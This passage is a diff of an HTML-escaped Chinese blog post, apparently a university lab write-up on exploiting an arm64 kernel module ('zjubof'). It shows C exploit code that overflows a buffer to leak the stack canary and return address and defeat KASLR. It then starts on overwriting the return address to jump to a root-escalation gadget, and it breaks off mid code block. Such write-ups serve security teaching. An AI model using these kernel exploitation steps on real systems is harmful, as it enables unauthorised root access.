+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">ssize_t&lt;/span> &lt;span class="nf">zjubof_write4&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="kt">size_t&lt;/span> &lt;span class="n">len&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">cmd_struct&lt;/span> &lt;span class="n">cmd&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printk&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;zjubof_write4&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">command&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">16&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">length&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">len&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">length&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">length&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">16&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">command&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">len&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">prev_cmd&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">command&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">length&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printk&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;cmd :%s len:%ld&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">command&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">len&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">ssize_t&lt;/span> &lt;span class="nf">zjubof_write3&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="kt">size_t&lt;/span> &lt;span class="n">len&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printk&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;zjubof_write3&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">zjubof_write4&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">len&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>函数调用栈如下所示：&lt;/p>
+&lt;p>&lt;img src="https://unicocn.github.io/p/rop/image-20230529211914280.png"
+width="594"
+height="455"
+srcset="https://unicocn.github.io/p/rop/image-20230529211914280_hu9af7c3d1e3967cbab122f626a2fd3d03_44781_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/rop/image-20230529211914280_hu9af7c3d1e3967cbab122f626a2fd3d03_44781_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 1"
+class="gallery-image"
+data-flex-grow="130"
+data-flex-basis="313px"
+>&lt;/p>
+&lt;ol start="2">
+&lt;li>触发buffer overflow的核心在于：&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">length&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">length&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">16&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// 尽管程序对于cmd.length作出了限制，但是并没有对len进行限制
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">command&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">len&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 通过buffer覆盖cmd.length
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// 此时cmd.length被修改，prev_cmd可以读取到canary/lr信息
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">prev_cmd&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">command&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">length&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>因此我们可以构造buffer如下：&lt;/p>
+&lt;p>&lt;img src="https://unicocn.github.io/p/rop/image-20230529212113961.png"
+width="687"
+height="470"
+srcset="https://unicocn.github.io/p/rop/image-20230529212113961_hu79328bc564a5f6dee0d09ac1cb868fe2_54418_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/rop/image-20230529212113961_hu79328bc564a5f6dee0d09ac1cb868fe2_54418_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 2"
+class="gallery-image"
+data-flex-grow="146"
+data-flex-basis="350px"
+>&lt;/p>
+&lt;p>&lt;code>buf[49] = &amp;quot;0123456789ABCDEF\x30&amp;quot;&lt;/code>，49 = 48 + 1,48为需要泄露的字节数，1为buf末尾的&lt;code>\0&lt;/code>&lt;/p>
+&lt;ol start="3">
+&lt;li>进而我们可以泄露&lt;code>canary/lr/oldfp&lt;/code>，由于&lt;code>lr(ra)&lt;/code>保存的是&lt;code>zjubof_write2&lt;/code>中调用&lt;code>zjubof_write3&lt;/code>之后的返回地址，反汇编&lt;code>zjubof_write2&lt;/code>得到无偏移的RA，再与开启KASLR的&lt;code>lr(ra)&lt;/code>相减即可得到偏移&lt;/li>
+&lt;/ol>
+&lt;p>&lt;img src="https://unicocn.github.io/p/rop/image-20230529212840416.png"
+width="572"
+height="498"
+srcset="https://unicocn.github.io/p/rop/image-20230529212840416_huaea8b7bea405384b97b0865fae1e70c2_78369_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/rop/image-20230529212840416_huaea8b7bea405384b97b0865fae1e70c2_78369_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 3"
+class="gallery-image"
+data-flex-grow="114"
+data-flex-basis="275px"
+>&lt;/p>
+&lt;p>关键代码如下:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">const&lt;/span> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">RAWithoutKASLR&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xffff800010de7d0c&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">char&lt;/span> &lt;span class="n">canaryStr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// canary
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="n">oldFPStr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// fp of zjubof_write2
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="n">oldRAStr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// ra of zjubof_write3 -&amp;gt; zjubof_write2
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">size_t&lt;/span> &lt;span class="nf">getOffset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">49&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;0123456789ABCDEF&lt;/span>&lt;span class="se">\x30&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// cmd.command = &amp;#34;0123456789ABCDEF&amp;#34;, cmd.length = 0x30
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">24&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// // 16 + 8 B
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">48&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// CMD_LENGTH = 49, len &amp;lt; 49
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">canaryStr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">canaryStr&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">canaryStr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">oldFPStr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">oldFPStr&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">oldFPStr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">oldRAStr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">oldRAStr&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">oldRAStr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">40&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">canary&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">size_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">canaryStr&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">oldFP&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">size_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">oldFPStr&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">oldRA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">size_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">oldRAStr&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">oldRA&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">RAWithoutKASLR&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ol start="4">
+&lt;li>结果&lt;/li>
+&lt;/ol>
+&lt;p>&lt;img src="https://unicocn.github.io/p/rop/image-20230529212933009.png"
+width="354"
+height="153"
+srcset="https://unicocn.github.io/p/rop/image-20230529212933009_hu8775550a8669ad711ce7e59bc80e655e_8390_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/rop/image-20230529212933009_hu8775550a8669ad711ce7e59bc80e655e_8390_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 4"
+class="gallery-image"
+data-flex-grow="231"
+data-flex-basis="555px"
+>&lt;/p>
+&lt;p>至此，我们成功泄露了canary和offset，之后就可以通过偏移量绕过&lt;code>KASLR&lt;/code>&lt;/p>
+&lt;h2 id="task2-修改return-address获取-root-权限">Task2: 修改return address，获取 root 权限&lt;/h2>
+&lt;ol>
+&lt;li>Task2要求我们修改&lt;code>ra&lt;/code>，跳转到&lt;code>first_level_gadget&lt;/code>，由&lt;code>first_level_gadget&lt;/code>实现提权；我们先反汇编一下&lt;code>first_level_gadget&lt;/code>，发现第一行代码修改了&lt;code>sp&lt;/code>，而修改&lt;code>ra&lt;/code>后返回时，&lt;code>sp&lt;/code>已经被设置好了，如果此时跳转到第一行，&lt;code>sp&lt;/code>再次被修改，就会导致栈空间出错，进而导致程序出错，因此需要跳到第二行&lt;/li>
+&lt;/ol>
+&lt;p>&lt;img src="https://unicocn.github.io/p/rop/image-20230529213036319.png"
+width="653"
+height="275"
+srcset="https://unicocn.github.io/p/rop/image-20230529213036319_hu23ebf3c8033e62768ab42c177b0f29f4_43300_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/rop/image-20230529213036319_hu23ebf3c8033e62768ab42c177b0f29f4_43300_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 5"
+class="gallery-image"
+data-flex-grow="237"
+data-flex-basis="569px"
+>&lt;/p>
+&lt;ol start="2">
+&lt;li>分析函数调用时&lt;code>sp&lt;/code>的变化&lt;/li>
+&lt;/ol>
+&lt;ul>
+&lt;li>&lt;code>zjubof_write&lt;/code> call &lt;code>zjubof_write2&lt;/code>:&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">sp = sp - 220
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># ...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sp = sp + 220
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>&lt;code>zjubof_write2&lt;/code> call &lt;code>zjubof_write3&lt;/code>:&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">sp = sp - 32
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># ...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sp = sp + 32
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>&lt;code>zjubof_write3&lt;/code> call &lt;code>zjubof_write4&lt;/code>:&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">sp = sp - 80
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># ...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sp = sp + 80
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>当我们覆盖返回地址跳转到&lt;code>first_level_gadget&lt;/code>时，&lt;code>sp+80&lt;/code>和&lt;code>sp+32&lt;/code>已经被执行，此时的&lt;code>sp[0]&lt;/code>和&lt;code>sp[8]&lt;/code>分别指向&lt;code>zjubof_write&lt;/code>的&lt;code>oldfp(x29)&lt;/code>和&lt;code>ra(x30)&lt;/code>，在&lt;code>first_level_gadget&lt;/code>中无需再将&lt;code>x29&lt;/code>和&lt;code>x30&lt;/code>压栈，同时为了在&lt;code>first_level_gadget&lt;/code>执行完后能够正确返回到&lt;code>zjubof_write&lt;/code>，需要手动添加指令将&lt;code>sp+220&lt;/code>&lt;/p>
+&lt;ol start="3">
+&lt;li>分析得到栈空间如下，并构造buffer&lt;/li>
+&lt;/ol>
+&lt;p>&lt;img src="https://unicocn.github.io/p/rop/image-20230530005054928.png"
+width="614"
+height="411"
+srcset="https://unicocn.github.io/p/rop/image-20230530005054928_hu225a97505a205ec0338465a7beb7278c_59561_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/rop/image-20230530005054928_hu225a97505a205ec0338465a7beb7278c_59561_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 6"
+class="gallery-image"
+data-flex-grow="149"
+data-flex-basis="358px"
+>&lt;/p>
+&lt;p>buffer的前24字节和Task1是一样的，但是需要将Task1中得到的&lt;code>canary/oldfp&lt;/code>填入buffer的24-40字节，然后将新的返回地址填入40-48字节&lt;/p>
+&lt;ol start="4">
+&lt;li>关键代码及结果&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
